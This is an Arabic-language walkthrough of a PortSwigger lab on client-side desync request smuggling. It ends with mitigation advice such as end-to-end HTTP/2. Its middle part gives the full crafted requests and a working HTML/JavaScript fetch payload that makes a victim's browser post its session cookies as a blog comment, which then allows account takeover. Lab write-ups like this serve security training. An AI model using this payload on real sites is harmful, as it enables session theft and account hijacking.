# [Client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)

## **`الهدف`**
قم إنشاء `exploit` يتسبب في قيام متصفح الضحية بتسريب الـ`cookies` الخاصة به ثم استخدمها للدخول إلى حسابه.
## **`خطوات الحل`**
سنقوم بتحويل طلب الدخول إلى اللاب إلى `Repeater`
```http
GET / HTTP/1.1
Host: 0a0c00f004e381f081ee448c00950079.h1-web-security-academy.net
Cookie: session=CIg3Ow41BWKFKoSPS0RygAMvsC7hafsB
```
وسنقوم بإعادة إرسال الطلب مرة أخرى لنجد في الاستجابة أنه يتم عمل `redirect` لمسار أخر `en`
```http
HTTP/1.1 302 Found
Location: /en
X-Frame-Options: SAMEORIGIN
Keep-Alive: timeout=10
Content-Length: 0
```

ثم سنقوم بالتالي:
1. تعديل الـ `Method` عن طريق الضغط على الـ `Mouse right-click` ونضغط `Change request method` ليصبح `POST`.
2. تعديل جسم الطلب لاختبار وجود ثغرة `CSD` بالإضافة لجعلك قيمة `Content Lenth` أكبر من محتوى جسم الطلب.

ليصبح شكل الطلب فى النهاية كالتالي: 
```http
POST / HTTP/1.1
Host: 0a0c00f004e381f081ee448c00950079.h1-web-security-academy.net
Cookie: session=CIg3Ow41BWKFKoSPS0RygAMvsC7hafsB
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

GET /TEST HTTP/1.1
TEST1: TEST2
```
وسنجد أن السيرفر يرد بسرعة وهذا يعنى أنه يتجاهل جسم الطلب.

بعد ذلك سنقوم بإنشاء `Group` في `Repeater` يحتوى على طلب الهجوم الرئيسي الذي به الطلب المهرب،  وطلب أخر عادي 

```http
POST / HTTP/1.1
Host: 0a0c00f004e381f081ee448c00950079.h1-web-security-academy.net
Cookie: session=CIg3Ow41BWKFKoSPS0RygAMvsC7hafsB
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

GET /TEST HTTP/1.1
TEST1: TEST2
```

```http
GET / HTTP/1.1
Host: 0a0c00f004e381f081ee448c00950079.h1-web-security-academy.net
Cookie: session=CIg3Ow41BWKFKoSPS0RygAMvsC7hafsB
```
ثم سنرسلهم بـ `Send group in sequence (single connection)`
وسنجد أن استجابة الطلب الثاني العادي هي `404 Not Found` وهذ يعني أننا نجحنا في تهرب البادئة الخبيثة في الطلب الرئيسي
```http
HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Keep-Alive: timeout=10
Content-Length: 11

"Not Found"
```

بعد ذلك سنقوم بالدخول على أى تدوينة وكتابة أى تعليق ببيانات عشوائية، وبعد ذلك سنقوم بالبحث عن هذا الطلب في `HTTP history` لنفحص بنية الطلب:
```http
POST /en/post/comment HTTP/1.1
Host: 0a0c00f004e381f081ee448c00950079.h1-web-security-academy.net
Cookie: session=9nEw5C3M2Xt3vsClwt8sMZXa1Vm1OiZK
Content-Type: application/x-www-form-urlencoded
Content-Length: 125

csrf=m6XhaoynsE4acbbWReuYiQW4eVnsSFWU&postId=7&comment=test&name=test&email=test%40test.com&website=https%3A%2F%2Fexample.com
```

بعد ذلك سنقوم بتجهيز السكريبت مع مراعاة أننا سنحتاج إلى عدة تجارب لضبط قيمة الـ `Content-Length: 960` لكي لا تكون أقصر من اللازم فلا تظهر الـ `Cookie` الخاصة بالمستخدم ولا تكون أطول من اللازم فيتعطل الطلب، وكذلك يجب أن يكون أخر معلم في الطلب المهرب هو `Comment`
```html
<!DOCTYPE html> 
<html> 
<head> 
	<title>Poc</title>
</head> 
	<body> 
		<script>
			fetch('https://0a0c00f004e381f081ee448c00950079.h1-web-security-academy.net', {
			        method: 'POST',
			        body: 'POST /en/post/comment HTTP/1.1\r\nHost: 0a0c00f004e381f081ee448c00950079.h1-web-security-academy.net\r\nCookie: session=9nEw5C3M2Xt3vsClwt8sMZXa1Vm1OiZK\r\nContent-Length: 960\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=m6XhaoynsE4acbbWReuYiQW4eVnsSFWU&postId=7&name=Finale&email=test@test.com&website=https://example.com&comment=',
			        mode: 'cors',
			        credentials: 'include',
			    }).catch(() => {
			        fetch('https://0a0c00f004e381f081ee448c00950079.h1-web-security-academy.net/test', {
			        mode: 'no-cors',
			        credentials: 'include'
			    })
			})
		</script>
</body>
</html>
```
وبعد ذلك نقوم بالدخول إلى السيرفر الخاص بنا الذي يوفره اللاب ونضع السكريبت السابق في خانة `Body` ثم نقوم بالضغط على `Store` ثم `Deliver exploit to victim`

وعندما ندخل إلى التدوينة سنجد تعليق يحتوى على الطلب التالي:
```http
GET /test HTTP/1.1
Host: 0a0c00f004e381f081ee448c00950079.h1-web-security-academy.net
Connection: keep-alive sec-ch-ua-platform: "Linux" 
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36 sec-ch-ua: "Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99" 
sec-ch-ua-mobile: ?0 Accept: */* 
Sec-Fetch-Site: cross-site 
Sec-Fetch-Mode: no-cors 
Sec-Fetch-Dest: empty 
Sec-Fetch-Storage-Access: active 
Referer: https://exploit-0a4e00950420812381d543cd01750043.exploit-server.net/ 
Accept-Encoding: gzip, deflate, br, zstd Accept-Language: en-US,en;q=0.9 
Cookie: victim-fingerprint=49gaiB3aXuGPNDXwoH6KLgkOaowLqwCm; secret=KoTwYRMD4C0h3Eba5ibKdUvkIitVe3WR; session=T4Ua7blP5Nl06pzjqslDeeP5cKqwrWr6; _lab_analytics=WI0bQpAhyNNOMnrW7srwbRJZewJ2mlNB1OCn58xJYt0VpaicxdpQ5MvfcZceov5E
```
بعد ذلك سنقوم بنسخ الـ `session=T4Ua7blP5Nl06pzjqslDeeP5cKqwrWr6` ونتوجه إلى المتصفح ونضغط `F12` ثم  `Application` ونضعه في خانة الـ `Session` داخل الـ `Cookies` ثم نضغط `Enter` لنجد أننا داخل حساب الضحية لننتهي من حل اللاب.

**`ملاحظة هامة:`** في المواقع الحقيقة قد نحتاج إلى استعمال الطرق التي تم ذكرها في الحل الرسمي لهذا اللاب والشرح النظري على الـ `PortSwigger` لتجربة الاستغلال داخل المتصفح يدويًا عن طريق `developer tools` في المتصفح وما إلى ذلك.
## **`ترقيع الثغرة`**
يجب استخدام `HTTP/2 (End-to-End)` حيث أنه لا يعتمد على الترويسات النصية لتحديد طول الطلب، بل يعتمد على تقسيم البيانات إلى إطارات ثنائية `Binary Frames` مدمج بها طول كل إطار بشكل صريح.

ويجب ضبط سيرفر الواجهة الأمامية إذا تلقى طلباً غير صالح، أو طلباً بـ `Method` غير مدعومة، مثل `POST` على مسار لا يقبل إلا `GET` أن يرد فورًا بـ `405 Method Not Allowed` وإذا تلقى  أي طلب `GET` يحتوي على جسم يرد فورًا بـ بـ `400 Bad Request`.

ويجب إجبار سيرفر الواجهة الأمامية على قراءة كافة البيانات المحددة في ترويسة `Content-Length` أو `Transfer-Encoding` حتى النهاية قبل إرسال الاستجابة وقبل استقبال أي طلب جديد على نفس الاتصال، وإذا تم ضبط السيرفر للرد على الطلب قبل قراءة الـ `Body` بالكامل، فيجب عليه إغلاق الاتصال فوراً عن طريق إرسال ترويسة `Connection: close` في الاستجابة.

ويُنصح باستخدام نفس نوع وإصدار السيرفر للواجهتين الأمامية والخلفية إذا أمكن، وكذلك الالتزام بتحديث السيرفرات أولًا بأول لزيادة الأمان وتفادي جميع الثغرات فور ظهورها.
